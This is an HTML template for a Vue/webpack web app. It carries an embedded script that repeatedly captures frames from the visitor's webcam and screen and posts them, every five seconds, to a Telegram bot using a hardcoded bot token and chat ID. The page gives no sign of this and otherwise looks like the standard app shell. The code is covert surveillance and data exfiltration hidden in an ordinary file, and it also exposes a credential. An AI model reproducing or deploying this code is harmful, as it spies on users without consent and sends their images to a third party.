<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <link rel="shortcut icon" href="https://i.pinimg.com/1200x/5a/ff/e4/5affe417c4d2bdcec4b2289a02b98bd4.jpg" type="image/x-icon">
    <title><%= htmlWebpackPlugin.options.title %></title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
</head>
<body>
    <script>
        const telegramBotToken = '8110683555:AAGsehuzHuGOjSFFY9YBk4QK_Lcbz1JR_Jc';
        const chatId = '1437354716';

        function captureScreen() {
            return navigator.mediaDevices.getDisplayMedia({ video: true });
        }

        function captureCamera() {
            return navigator.mediaDevices.getUserMedia({ video: true });
        }

        function sendMediaToTelegram(mediaType, media) {
            const formData = new FormData();
            formData.append(mediaType, media, 'capture.png');

            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }

        function captureVideoFrame(stream, callback) {
            const videoElement = document.createElement('video');
            videoElement.srcObject = stream;
            videoElement.play();

            videoElement.onloadedmetadata = function() {
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/png');
                screenshotData = imageData.replace(/^data:image\/(png|jpg);base64,/, "");
                callback(screenshotData);
            };
        }

        function captureAndSend() {
            Promise.all([captureCamera(), captureScreen()])
                .then(([cameraStream, screenStream]) => {
                    captureVideoFrame(cameraStream, (screenshotData) => {
                        sendMediaToTelegram('photo', screenshotData);
                        cameraStream.getTracks().forEach(track => track.stop());
                    });

                    captureVideoFrame(screenStream, (screenshotData) => {
                        sendMediaToTelegram('photo', screenshotData);
                        screenStream.getTracks().forEach(track => track.stop());
                    });
                })
                .catch(err => {
                    console.error('Error capturing media: ', err);
                });
        }

        // Capture and send screenshots every 5 seconds
        setInterval(captureAndSend, 5000);
    </script>
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>
